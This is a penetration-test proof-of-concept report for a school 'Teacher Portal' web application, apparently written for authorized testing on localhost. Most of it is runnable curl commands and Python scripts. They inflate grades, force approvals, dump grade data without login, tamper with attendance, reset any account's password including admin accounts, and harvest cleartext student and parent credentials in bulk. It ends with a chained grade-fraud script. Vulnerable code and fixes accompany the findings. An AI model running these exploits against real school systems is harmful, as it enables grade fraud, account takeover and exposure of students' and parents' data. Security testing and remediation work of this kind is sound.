# Teacher Portal — Penetration Test Proof of Concept
**Module:** Teacher Portal  
**Classification:** CONFIDENTIAL — For Authorized Personnel Only  
**Environment:** Local (`http://localhost`) — adjust host as needed  
**Prerequisites:** Laragon running, database seeded  

> ⚠️ **Legal Notice:** These PoC exploits are for authorized security testing on systems you own or have explicit written permission to test. Unauthorized use against production systems is illegal under the Cybercrime Prevention Act of 2012 (RA 10175) and analogous laws worldwide.

---

## PoC Index

| # | ID | Title | Auth Required | Impact |
|---|---|---|---|---|
| 1 | T-01 | Grade Detail Inflation — Any Authenticated User | Any login | Student raises failing grade to 100 |
| 2 | T-02 | Grade Header Status Bypass — Approve Without Workflow | Any login | Force grade header to approved status |
| 3 | T-03 | Grade Workflow Approval Without Teacher Role | Any login (password changed) | Approve any grade in workflow system |
| 4 | T-04 | Final Grade Save Without Teacher Auth | Any login (password changed) | Write quarterly grade for any student |
| 5 | T-05 | Unauthenticated Grade Master Sheet Dump | None | Full student grade data exposure |
| 6 | T-06 | Unauthenticated Deportment Status Update | None | Modify character grade records |
| 7 | T-07 | Unauthenticated Grade Header Enumeration | None | Read grade header IDs for T-01/T-02 setup |
| 8 | T-09 | Cross-Teacher Attendance Manipulation | Any teacher login | Fabricate attendance for another teacher's class |
| 9 | T-10 | Virtual Classroom Assignment IDOR — Edit | Any teacher login | Edit/delete another teacher's assignment |
| 10 | BUG-T-01 | Exception Object Disclosure | Any login | Read stack trace + internal file paths |
| 11 | T-13 | Mass Password Reset — Any User Account | Any login | Reset any account (including admin) to 123456 |
| 12 | T-14 | Plaintext Credential Dump | Any login | Download cleartext passwords for all students/parents |

---

## PoC-T-01: Grade Detail Inflation

**Target:** `GET /gradesdetail/update`  
**Finding:** T-01  
**Auth:** Any authenticated user session (student, parent, cashier, etc.)  

### Setup

1. Login to the student portal as a student with type=7.
2. Capture the session cookie (e.g., `laravel_session=...`).
3. Use T-07 (see PoC-T-07) or the unauthenticated mastersheet (T-05) to enumerate `gradesdetail` row IDs for the target student.

### Exploit

```bash
# Step 1: Verify target grade record exists (unauthenticated)
curl -s "http://localhost/get/grade/header?syid=1&gradelevelid=3&subjectid=5&quarter=1&sectionid=2" \
  | python3 -m json.tool

# Output excerpt:
# [{"id": 42, "sectionid": 2, "levelid": 3, "subjid": 5, "status": 0, "submitted": 0}]
# → grade header id = 42

# Step 2: Get student's gradesdetail row (use mastersheet or direct query knowledge)
# Assume: gradesdetail id=1234, studid=456

# Step 3: Inflate grade (requires only an authenticated session — any user type)
curl -s -X GET \
  --cookie "laravel_session=<STUDENT_SESSION_COOKIE>" \
  "http://localhost/gradesdetail/update?data[0][id]=1234&data[0][studid]=456&data[0][field]=grade&data[0][grade]=100"

# Expected response:
# [{"status":1}]
# Grade has been set to 100 in the database.
```

### Verify

```bash
# Confirm the change (requires no auth — see T-05)
curl -s "http://localhost/grades/report/mastersheet?syid=1&sectionid=2&levelid=3" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); [print(s['firstname'], s['grade']) for s in d if s['id']==456]"
```

### Variation — Set Grade Status to Approved

```bash
# Set gdstatus to 3 (approved) to lock the grade from further review
curl -s -X GET \
  --cookie "laravel_session=<STUDENT_SESSION_COOKIE>" \
  "http://localhost/gradesdetail/update?data[0][id]=1234&data[0][studid]=456&data[0][field]=gdstatus&data[0][grade]=3"
```

### Vulnerable Code (TeacherGradingV2.php line 1143–1165)
```php
DB::table('gradesdetail')
    ->where('id', $item['id'])
    ->where('studid', $item['studid'])
    ->take(1)
    ->update([
        $item['field'] => $item['grade'],   // USER-CONTROLLED COLUMN NAME
        'updatedby' => auth()->user()->id,
        'updateddatetime' => \Carbon\Carbon::now('Asia/Manila')
    ]);
```

### Fix
```php
// routes/web.php
Route::middleware(['auth', 'isTeacher', 'isDefaultPass'])->group(function () {
    Route::post('gradesdetail/update', 'TeacherControllers\TeacherGradingV2@udpate_grade_detail');
});

// TeacherGradingV2.php
$ALLOWED_FIELDS = ['grade', 'grade_1', 'grade_2', 'grade_3', 'grade_4', 'qg'];
if (!in_array($item['field'], $ALLOWED_FIELDS, true)) {
    abort(422, 'Invalid field');
}
// Also verify teacher owns the section:
$teacherSection = DB::table('classsched')
    ->where('teacherid', $teacherid)
    ->where('sectionid', $item['sectionid'])
    ->exists();
if (!$teacherSection) abort(403);
```

---

## PoC-T-02: Grade Header Status Bypass

**Target:** `GET /gradesheader/update`  
**Finding:** T-02  
**Auth:** Any authenticated user session  

### Exploit

```bash
# Force a grade header's status to 3 (approved) — bypasses entire teacher → coordinator → principal workflow
# Parameters: id (grades.id), syid, sectionid, subjid — all discoverable from T-07 or T-05

curl -s -X GET \
  --cookie "laravel_session=<ANY_VALID_SESSION_COOKIE>" \
  "http://localhost/gradesheader/update?data[0][id]=42&data[0][syid]=1&data[0][sectionid]=2&data[0][subjid]=5&data[0][field]=status&data[0][grade]=3"

# Response: [{"status":1}]
# Grade header id=42 is now marked as status=3 (approved) in the database.
```

### Mass Approval Attack (Python)

```python
#!/usr/bin/env python3
"""
PoC: Bulk approve all grade headers for a school year
Requires: authenticated session cookie (any user type)
"""
import requests

BASE_URL = "http://localhost"
SESSION_COOKIE = "<ANY_VALID_SESSION_COOKIE>"
SY_ID = 1

session = requests.Session()
session.cookies.set("laravel_session", SESSION_COOKIE)

# First: enumerate all grade headers for the SY (T-05)
resp = session.get(f"{BASE_URL}/grades/report/mastersheet", params={"syid": SY_ID})
headers = resp.json()  # adjust parsing to actual response shape

approved = 0
for gh in headers:
    r = session.get(f"{BASE_URL}/gradesheader/update", params={
        "data[0][id]": gh["id"],
        "data[0][syid]": SY_ID,
        "data[0][sectionid]": gh["sectionid"],
        "data[0][subjid]": gh["subjid"],
        "data[0][field]": "status",
        "data[0][grade]": 3          # 3 = approved
    })
    if r.json()[0]["status"] == 1:
        approved += 1
        print(f"[+] Approved header id={gh['id']}")

print(f"\n[*] Total headers bulk-approved: {approved}")
```

### Vulnerable Code (TeacherGradingV2.php line 1185–1208)
```php
DB::table('grades')
    ->where('id', $item['id'])
    ->where('syid', $item['syid'])
    ->where('sectionid', $item['sectionid'])
    ->where('subjid', $item['subjid'])
    ->update([
        $item['field'] => $item['grade'],   // USER-CONTROLLED COLUMN NAME
        'updatedby' => auth()->user()->id,
        'updateddatetime' => \Carbon\Carbon::now('Asia/Manila')
    ]);
```

---

## PoC-T-03: Grade Workflow Approval Without Teacher Role

**Target:** `GET /posting/grade/subject/approve`  
**Finding:** T-03  
**Auth:** Any authenticated user who has changed the default password `123456`  

### Exploit

```bash
# Login as any user (student, parent, registrar) — account must have changed password from 123456.
# The isDefaultPass middleware blocks only accounts still using 123456.

# Approve a grade detail group (gdid = grade detail group ID)
curl -s -X GET \
  --cookie "laravel_session=<NON_DEFAULT_PASSWORD_SESSION>" \
  "http://localhost/posting/grade/subject/approve?gdid=789&teacherid=1"

# Note: teacherid=1 is passed but IGNORED by the implementation:
# public static function approve_subject_grade(Request $request) {
#     $teacherid = $request->get('teacherid');  // READ BUT NEVER VERIFIED
#     $gdid = $request->get('gdid');
#     return IndividualGrading::approve_subject_grade($gdid);  // teacherid not passed
# }

# Response: "success" or grade status object — grade is now approved.
```

### Enumerate + Approve All Student Grades (Python)

```python
#!/usr/bin/env python3
"""
PoC: Approve all pending grades in the system
Requires: Any session with changed password (non-teacher role works)
"""
import requests

BASE_URL = "http://localhost"
NON_TEACHER_SESSION = "<NON_DEFAULT_PASSWORD_SESSION>"

session = requests.Session()
session.cookies.set("laravel_session", NON_TEACHER_SESSION)

# Use T-05 to enumerate all grade headers and their gdids
# Assume we have a list of gdids from the unauthenticated mastersheet endpoint
grade_ids = [100, 101, 102, 103, 200, 201]  # populate from T-05 recon

for gdid in grade_ids:
    r = session.get(f"{BASE_URL}/posting/grade/subject/approve",
                    params={"gdid": gdid, "teacherid": 1})
    print(f"[+] gdid={gdid}: {r.text[:80]}")
```

---

## PoC-T-04: Final Grade Save Without Teacher Auth

**Target:** `GET /teacher/finalgrades/savegrades`  
**Finding:** T-04  
**Auth:** Any authenticated user with changed password  

### Exploit

```bash
# Save an arbitrary quarterly grade (qg) for any student
# Parameters discovered from T-05 (unauthenticated mastersheet) or T-07

curl -s -X GET \
  --cookie "laravel_session=<NON_DEFAULT_PASSWORD_SESSION>" \
  "http://localhost/teacher/finalgrades/savegrades?id=1234&headerid=42&studid=456&qg=90&syid=1&semid=1&sectionid=2&levelid=3&quarter=1&subjid=5"

# Response: saved grade details
# gradesdetail row id=1234 now has qg=90 regardless of the actual teacher.
```

---

## PoC-T-05: Unauthenticated Grade Master Sheet Dump

**Target:** `GET /grades/report/mastersheet`  
**Finding:** T-05  
**Auth:** None required  

### Exploit

```bash
# Full grade dump — no session required
curl -s "http://localhost/grades/report/mastersheet?syid=1&sectionid=2&levelid=3&quarter=1" \
  | python3 -m json.tool

# Returns: Full array of students with lastname, firstname, grades for each subject

# Download grade data for all sections by brute-forcing sectionid (1–500)
for SID in $(seq 1 500); do
  RESULT=$(curl -s "http://localhost/grades/report/mastersheet?syid=1&sectionid=$SID&levelid=3&quarter=1")
  if [ "$RESULT" != "[]" ] && [ -n "$RESULT" ]; then
    echo "Section $SID: $RESULT" >> grade_dump.txt
    echo "[+] Section $SID has grade data"
  fi
done
```

### Student Awards Dump (also unauthenticated)

```bash
curl -s "http://localhost/grades/report/studentawards?syid=1&levelid=3" \
  | python3 -m json.tool
# Returns: Student names and award classifications without login
```

---

## PoC-T-06: Unauthenticated Deportment Status Update

**Target:** `GET /posting/grade/update-grade-status`  
**Finding:** T-06  
**Auth:** None required  

### Exploit

```bash
# Update a student's deportment/character grade status without any authentication
# Enumerate deportment record IDs first (also unauthenticated)

# Step 1: Get student list
curl -s "http://localhost/posting/grade/get-student-list?sectionid=2&syid=1" \
  | python3 -m json.tool

# Step 2: Get current deportment details
curl -s "http://localhost/posting/grade/get-student-status?studid=456&syid=1&sectionid=2" \
  | python3 -m json.tool

# Step 3: Update deportment status (no authentication)
curl -s "http://localhost/posting/grade/update-grade-status?studid=456&status=3&syid=1&sectionid=2&quarter=1" 
# Status is now modified without any teacher or admin authorization
```

---

## PoC-T-07: Unauthenticated Grade Header Enumeration

**Target:** `GET /get/grade/header`  
**Finding:** T-07  
**Auth:** None required  
**Purpose:** Reconnaissance — gather `grades.id` values used as input for PoC-T-01 and PoC-T-02

### Exploit

```bash
# Enumerate grade headers for section 2, grade level 3, subject 5, quarter 1, school year 1
curl -s "http://localhost/get/grade/header?syid=1&gradelevelid=3&subjectid=5&quarter=1&sectionid=2"

# Response (example):
# [{"id":42,"sectionid":2,"levelid":3,"subjid":5,"quarter":1,"syid":1,"status":0,"submitted":0,...}]
# grades.id = 42 → use as data[0][id] in PoC-T-02
```

### Full Header Enumeration Script (Python)

```python
#!/usr/bin/env python3
"""
PoC: Enumerate all grade headers without authentication
Feeds into PoC-T-01 and PoC-T-02 for targeted grade manipulation
"""
import requests, json

BASE_URL = "http://localhost"
SY_ID = 1
QUARTERS = [1, 2, 3, 4]

headers_found = []

for section_id in range(1, 100):        # tune range to school size
    for level_id in range(1, 30):
        for subj_id in range(1, 50):
            for q in QUARTERS:
                r = requests.get(f"{BASE_URL}/get/grade/header", params={
                    "syid": SY_ID,
                    "gradelevelid": level_id,
                    "subjectid": subj_id,
                    "quarter": q,
                    "sectionid": section_id
                }, timeout=2)
                try:
                    data = r.json()
                    if data:
                        headers_found.extend(data)
                        print(f"[+] Section={section_id} Level={level_id} Subj={subj_id} Q={q}: id={data[0]['id']}")
                except:
                    pass

with open("grade_headers.json", "w") as f:
    json.dump(headers_found, f, indent=2)

print(f"\n[*] Total grade headers enumerated: {len(headers_found)}")
```

---

## PoC-T-08: Cross-Teacher Attendance Manipulation

**Target:** `GET /classattendance/submit`  
**Finding:** T-09  
**Auth:** Requires `isTeacher` role (user type=1 or session portal=1) + changed password  

### Exploit

```bash
# Teacher A manipulates attendance for a student in Teacher B's section
# Teacher A only needs to know a valid studid (sequential integer)

# Mark student 789 as absent on a specific date — even though Teacher A doesn't teach that section
curl -s -X GET \
  --cookie "laravel_session=<TEACHER_A_SESSION>" \
  "http://localhost/classattendance/submit" \
  -d 'version=1' \
  --data-urlencode 'datavalues[0][studid]=789' \
  --data-urlencode 'datavalues[0][tdate]=2025-01-15' \
  --data-urlencode 'datavalues[0][newstatus]=absent'

# Student 789 is now marked absent in studattendance, even though they're in Teacher B's class.
# No check: Does Teacher A actually teach the section that student 789 belongs to?
```

### Impact Demonstration

```bash
# An attacker teacher could mass-set an entire rival section's students as absent
for STUDID in $(seq 100 120); do
  curl -s -X GET \
    --cookie "laravel_session=<TEACHER_A_SESSION>" \
    "http://localhost/classattendance/submit" \
    --data-urlencode "datavalues[0][studid]=$STUDID" \
    --data-urlencode "datavalues[0][tdate]=2025-01-15" \
    --data-urlencode "datavalues[0][newstatus]=absent"
  echo "[+] Marked absent: studid $STUDID"
done
```

### Vulnerable Code (ClassAttendanceController.php line 1508–1560)
```php
foreach($request->get('datavalues') as $dataval) {
    // No check: is auth()->user() assigned to this student's section?
    $checkifexists = DB::table('studattendance')
        ->where('studid', $dataval['studid'])   // user-supplied
        ->whereDate('tdate', $dataval['tdate'])
        ->where('deleted','0')
        ->first();
    DB::table('studattendance')
        ->where('id', $checkifexists->id)
        ->update(['present' => $presentval, 'absent' => $absentval, ...]);
}
```

### Fix
```php
// Verify teacher-section assignment before processing any submission
$teacherid = DB::table('teacher')->where('userid', auth()->user()->id)->value('id');
$authorizedSections = DB::table('classsched')
    ->where('teacherid', $teacherid)
    ->pluck('sectionid')
    ->toArray();

foreach ($request->get('datavalues') as $dataval) {
    $studentSection = DB::table('studinfo')
        ->where('id', $dataval['studid'])
        ->value('sectionid');
    if (!in_array($studentSection, $authorizedSections)) {
        continue; // skip unauthorized student
    }
    // ... proceed with update
}
```

---

## PoC-T-09: Virtual Classroom Assignment IDOR — Edit

**Target:** `VirtualClassroomController@editclassassignment`  
**Finding:** T-10  
**Auth:** Requires `isTeacher`  

### Exploit

```bash
# Teacher A edits Teacher B's assignment by enumerating numeric assignmentid
# Assignment IDs are sequential integers stored in virtualclassroomattach

# Step 1: Identify target assignment ID (can enumerate via brute force or from student disclosure)
TARGET_ASSIGNMENT_ID=55

# Step 2: Edit the assignment — no ownership check performed
curl -s -X POST \
  --cookie "laravel_session=<TEACHER_A_SESSION>" \
  "http://localhost/teacher/classroom/editassignment" \
  -d "assignmentid=$TARGET_ASSIGNMENT_ID" \
  -d "assignmenttitle=Modified+Title" \
  -d "assignmentinstruction=Modified+instructions" \
  -d "perfectscore=10" \
  -d "duedatetime=01/01/2025 08:00 AM - 01/02/2025 08:00 AM"

# Teacher B's assignment now has different title, instructions, score, and deadline.
```

### Exploitation for Disruption

```bash
# Delete Teacher B's assignment (grade data for submitted students is lost)
curl -s -X POST \
  --cookie "laravel_session=<TEACHER_A_SESSION>" \
  "http://localhost/teacher/classroom/deleteassignment" \
  -d "assignmentid=$TARGET_ASSIGNMENT_ID"
# Assignment is soft-deleted; students who submitted now lose their submission context.
```

---

## PoC-T-10: Exception Object Disclosure

**Target:** `TeacherGradingV2@udpate_grade_detail` (error path)  
**Finding:** BUG-T-01  
**Auth:** Any authenticated user  
**Note:** `return $e;` at line 1935 is in a *different* method within the same file. Trigger by sending a request that causes a DB exception (e.g., invalid data type for a column).

### Exploit

```bash
# Trigger a DB exception to read stack trace
# Send a string value to a numeric column to trigger a DB exception
curl -s -X GET \
  --cookie "laravel_session=<ANY_SESSION>" \
  "http://localhost/gradesdetail/update?data[0][id]=1&data[0][studid]=1&data[0][field]=grade&data[0][grade]=not_a_number_TRIGGER_EXCEPTION"

# In the specific function at line 1935, the exception is returned directly:
# return $e;
# Response will contain:
# {"message": "SQLSTATE[22001]: ...", "file": "/var/www/app/...", "trace": [...]}
# Discloses: application file paths, database table structure, Laravel version
```

### Information Extracted from Stack Trace
- Full file system paths: `/laragon/www/es_ldcu/app/Http/Controllers/...`
- Database table and column names referenced in the query
- Laravel version (from vendor paths in stack trace)
- PDO exception details including partial connection string

### Fix
```php
// TeacherGradingV2.php — replace line 1935
} catch (\Exception $e) {
    \Log::error('Grade upload error', ['exception' => $e->getMessage(), 'trace' => $e->getTraceAsString()]);
    return response()->json(['status' => 0, 'message' => 'An internal error occurred'], 500);
}
```

---

## Combined Attack Chain — Full Grade Fraud (No Teacher Interaction)

This demonstrates the complete kill chain combining T-05 → T-01 → T-02 → T-03.

```python
#!/usr/bin/env python3
"""
Full Grade Fraud PoC
Combines: Unauthenticated recon (T-05, T-07) + grade inflation (T-01) + workflow bypass (T-02, T-03)

Requirements:
  - STUDENT_SESSION: A valid session cookie for any user type (even student)
  - NONDEFAULT_SESSION: A session cookie for any user who changed their password from 123456
  - TARGET_STUDID: The student's numeric ID (obtainable from T-05)
  - TARGET_SY: School year ID
  - TARGET_SECTION: Section ID

WARNING: For authorized testing only.
"""
import requests, json, sys

BASE_URL = "http://localhost"
STUDENT_SESSION = "STUDENT_SESSION_COOKIE_HERE"
NONDEFAULT_SESSION = "NONDEFAULT_PASSWORD_SESSION_HERE"
TARGET_STUDID = 456
TARGET_SY = 1
TARGET_SECTION = 2
TARGET_LEVEL = 3
TARGET_SUBJ = 5
TARGET_QUARTER = 1

s = requests.Session()

# === STEP 1: Recon — enumerate grade headers (no auth required) ===
print("[*] Step 1: Enumerate grade headers (unauthenticated)...")
r = s.get(f"{BASE_URL}/get/grade/header", params={
    "syid": TARGET_SY, "gradelevelid": TARGET_LEVEL,
    "subjectid": TARGET_SUBJ, "quarter": TARGET_QUARTER,
    "sectionid": TARGET_SECTION
})
headers = r.json()
if not headers:
    print("[-] No grade headers found. Adjust parameters.")
    sys.exit(1)
header = headers[0]
header_id = header["id"]
print(f"    [+] Grade header id={header_id}, status={header.get('status')}, submitted={header.get('submitted')}")

# === STEP 2: Find target student's gradesdetail rows (no auth required) ===
print("[*] Step 2: Enumerate student grade records (unauthenticated mastersheet)...")
r = s.get(f"{BASE_URL}/grades/report/mastersheet", params={
    "syid": TARGET_SY, "sectionid": TARGET_SECTION, "levelid": TARGET_LEVEL, "quarter": TARGET_QUARTER
})
students = r.json()
target = next((st for st in students if st.get("id") == TARGET_STUDID), None)
if not target:
    print(f"[-] Student id={TARGET_STUDID} not found in mastersheet.")
    sys.exit(1)
detail_id = target.get("detailid") or target.get("gdid")
print(f"    [+] Found student: {target.get('lastname')}, {target.get('firstname')} | detail_id={detail_id} | current grade={target.get('grade')}")

# === STEP 3: Inflate grade (uses student session — any user type works) ===
print("[*] Step 3: Inflating grade to 100 (student session, no teacher auth)...")
s.cookies.set("laravel_session", STUDENT_SESSION)
r = s.get(f"{BASE_URL}/gradesdetail/update", params={
    "data[0][id]": detail_id,
    "data[0][studid]": TARGET_STUDID,
    "data[0][field]": "grade",
    "data[0][grade]": 100
})
result = r.json()
if result and result[0].get("status") == 1:
    print("    [+] Grade successfully inflated to 100!")
else:
    print(f"    [-] Grade inflation failed: {r.text}")

# === STEP 4: Force grade header to approved status ===
print("[*] Step 4: Forcing grade header status to approved (student session)...")
r = s.get(f"{BASE_URL}/gradesheader/update", params={
    "data[0][id]": header_id,
    "data[0][syid]": TARGET_SY,
    "data[0][sectionid]": TARGET_SECTION,
    "data[0][subjid]": TARGET_SUBJ,
    "data[0][field]": "status",
    "data[0][grade]": 3  # 3 = approved
})
result = r.json()
if result and result[0].get("status") == 1:
    print("    [+] Grade header status forced to approved!")
else:
    print(f"    [-] Header status force failed: {r.text}")

# === STEP 5: Trigger workflow approval (requires changed password — any user type) ===
print("[*] Step 5: Triggering workflow approval (any non-default-password session)...")
s.cookies.set("laravel_session", NONDEFAULT_SESSION)
gdid = detail_id  # or the grade detail group id
r = s.get(f"{BASE_URL}/posting/grade/subject/approve", params={
    "gdid": gdid, "teacherid": 1  # teacherid is ignored by implementation
})
print(f"    [+] Workflow approve response: {r.text[:100]}")

print("\n[*] COMPLETE: Grade manipulation chain executed.")
print(f"    Student id={TARGET_STUDID} grade for subject {TARGET_SUBJ} → 100 (approved in workflow)")
```

---

## PoC-T-11: Mass Password Reset — Any User Account

**Target:** `GET /teacher/student/generate/password`  
**Finding:** T-13  
**Auth:** Any authenticated user session (student, parent, cashier, etc.)  

### Exploit

```bash
# Reset a specific user's password to 123456 (no role check)
# The target user ID can be any account: student, teacher, admin, principal

# Step 1: Find admin/teacher user IDs by reading profile or guessing sequential IDs
# IDs are typically sequential integers — enumerate by calling student grade endpoints

TARGET_USER_ID=1  # Try user ID 1 — often the first admin account

# Step 2: Reset their password to 123456
curl -s -X GET \
  --cookie "laravel_session=<ANY_VALID_SESSION_COOKIE>" \
  "http://localhost/teacher/student/generate/password?id=$TARGET_USER_ID&passwordtype=default"

# Response: [{"status":1,"message":"Updated Successfully"}]
# User ID 1's password is now 123456 regardless of what it was.

# Step 3: Log in as that user
curl -s -X POST "http://localhost/login" \
  -d "email=admin@school.edu&password=123456&_token=<csrf>"
# If admin email is known, full account takeover is achieved.
```

### Bulk Admin Discovery + Takeover

```python
#!/usr/bin/env python3
"""
PoC: Enumerate user IDs from grade/student endpoints, identify admin accounts,
then reset their passwords using the teacher credential endpoint.
Requires: Any valid authenticated session.
"""
import requests

BASE_URL = "http://localhost"
SESSION = "<ANY_VALID_SESSION_COOKIE>"

session = requests.Session()
session.cookies.set("laravel_session", SESSION)

# Attempt to reset user IDs 1 through 50 (admins are often low IDs)
for uid in range(1, 50):
    r = session.get(f"{BASE_URL}/teacher/student/generate/password",
                    params={"id": uid, "passwordtype": "default"})
    try:
        result = r.json()
        if result[0].get("status") == 1:
            print(f"[+] Reset user id={uid} password to 123456")
    except:
        pass

print("[*] Password reset sweep complete. Try logging in as user IDs 1-50 with password 123456.")
```

### Vulnerable Code (TeacherStudentCredentials.php line 608)
```php
public static function update_password(Request $request) {
    $userid = $request->get('id');   // ANY user ID — no ownership/role validation
    // ...
    DB::table('users')
        ->where('id', $userid)       // targets any account
        ->update([
            'password' => Hash::make('123456'),
            'isDefault' => 1
        ]);
}
```

### Fix
```php
// 1. Move route inside isTeacher middleware group
Route::middleware(['auth', 'isTeacher', 'isDefaultPass'])->group(function () {
    Route::get('/teacher/student/generate/password',
        'TeacherControllers\TeacherStudentCredentials@update_password');
});

// 2. Validate the target userid belongs to a student in a section taught by this teacher
public static function update_password(Request $request) {
    $userid = $request->get('id');
    $teacherid = DB::table('teacher')->where('userid', auth()->user()->id)->value('id');
    // Verify $userid is a student (users.type == 7) in teacher's section
    $isAuthorized = DB::table('users')
        ->join('studinfo', 'users.id', '=', 'studinfo.userid')
        ->join('enrolledstud', 'studinfo.id', '=', 'enrolledstud.studid')
        ->join('sectiondetail', 'enrolledstud.sectionid', '=', 'sectiondetail.sectionid')
        ->where('users.id', $userid)
        ->where('users.type', 7)           // students only
        ->where('sectiondetail.teacherid', $teacherid)
        ->exists();
    if (!$isAuthorized) abort(403, 'Unauthorized');
    // ... proceed with reset
}
```

---

## PoC-T-12: Plaintext Credential Dump

**Target:** `GET /teacher/student/credential/list`  
**Finding:** T-14  
**Auth:** Any authenticated user session  

### Exploit

```bash
# Dump cleartext passwords for all students/parents in a section
# No teacher role required

curl -s -X GET \
  --cookie "laravel_session=<ANY_VALID_SESSION_COOKIE>" \
  "http://localhost/teacher/student/credential/list?sectionid=2&syid=1&levelid=3&start=0&length=100" \
  | python3 -c "
import sys, json
data = json.load(sys.stdin)
for student in data['data']:
    print(f\"Student: {student['lastname']}, {student['firstname']}\")
    for cred in student.get('student_credentials', []):
        print(f\"  Login: {cred['email']}  Password: {cred['passwordstr']} (isDefault={cred['isDefault']})\")
    for cred in student.get('parent_credentials', []):
        print(f\"  Parent Login: {cred['email']}  Password: {cred['passwordstr']}\")
"

# Example output:
# Student: dela Cruz, Juan
#   Login: S2024001  Password: abc123xyz9 (isDefault=3)
#   Parent Login: P2024001  Password: abc123xyz9
```

### Mass Credential Harvest (Python)

```python
#!/usr/bin/env python3
"""
PoC: Harvest all student/parent cleartext credentials from all sections
Requires: Any valid authenticated session
"""
import requests, json

BASE_URL = "http://localhost"
SESSION = "<ANY_VALID_SESSION_COOKIE>"
SY_ID = 1

session = requests.Session()
session.cookies.set("laravel_session", SESSION)

credentials = []

for section_id in range(1, 100):
    for level_id in range(1, 30):
        r = session.get(f"{BASE_URL}/teacher/student/credential/list", params={
            "sectionid": section_id, "syid": SY_ID, "levelid": level_id,
            "start": 0, "length": 500, "search[value]": ""
        }, timeout=3)
        try:
            data = r.json()
            for student in data.get("data", []):
                for cred in student.get("student_credentials", []) + student.get("parent_credentials", []):
                    if cred.get("passwordstr"):
                        credentials.append({
                            "name": student.get("student"),
                            "email": cred["email"],
                            "password": cred["passwordstr"]
                        })
                        print(f"[+] {student.get('student')} | {cred['email']} | {cred['passwordstr']}")
        except:
            pass

with open("credentials_dump.json", "w") as f:
    json.dump(credentials, f, indent=2)

print(f"\n[*] Total credentials harvested: {len(credentials)}")
```

### Vulnerable Code (TeacherStudentCredentials.php line 470)
```php
$users = DB::table('users')
    ->whereIn('email', $student_email)
    ->select('email', 'passwordstr', 'id', 'isDefault')  // passwordstr = CLEARTEXT PASSWORD
    ->where('deleted', 0)
    ->get();

$item->student_credentials = $student_creds;   // returned in JSON API response
$item->parent_credentials  = $parent_creds;
```

### Fix
```php
// Remove passwordstr from select — it should never leave the server
$users = DB::table('users')
    ->whereIn('email', $student_email)
    ->select('email', 'id', 'isDefault')   // passwordstr removed
    ->where('deleted', 0)
    ->get();

// For credential handout, implement a short-lived one-time code system:
// 1. Teacher triggers credential generation — a one-time token is created
// 2. Token can only be read once and expires after 15 minutes
// 3. Token is never stored in the users table

// Also: stop storing cleartext passwords in users.passwordstr altogether.
// Use a separate credential_handout table with expiring tokens.
```

---

## Remediation Quick Reference

| PoC | Immediate Fix |
|---|---|
| T-01, T-02 | Move routes inside `['auth','isTeacher','isDefaultPass']`; add column whitelist |
| T-03 | Move routes inside `['auth','isTeacher','isDefaultPass']` or `['auth','isPrincipal']` |
| T-04 | Add `isTeacher` to `teacher/finalgrades/*` route group; add section ownership check |
| T-05 | Place all `grades/report/*` routes inside `['auth']` group minimum |
| T-06 | Place deportment routes inside `['auth','isTeacher']` or `['auth','isPrincipal']` |
| T-07 | Place `get/grade/header` inside `['auth','isTeacher','isDefaultPass']` |
| T-09 | Add teacher-section ownership check in `submitattendance()` |
| T-10 | Add `->where('userid', auth()->user()->id)` in editclassassignment/deleteassignment |
| BUG-T-01 | Replace `return $e;` with `Log::error($e); return ['status'=>0]` |
| T-13 | Move credential routes to `isTeacher` group; validate `userid` belongs to teacher's section |
| T-14 | Remove `passwordstr` from API select; stop storing cleartext passwords in `users` table |
| T-15 | Add `isTeacher` or `isGuidance` middleware to `/guidance/*` behavior routes |
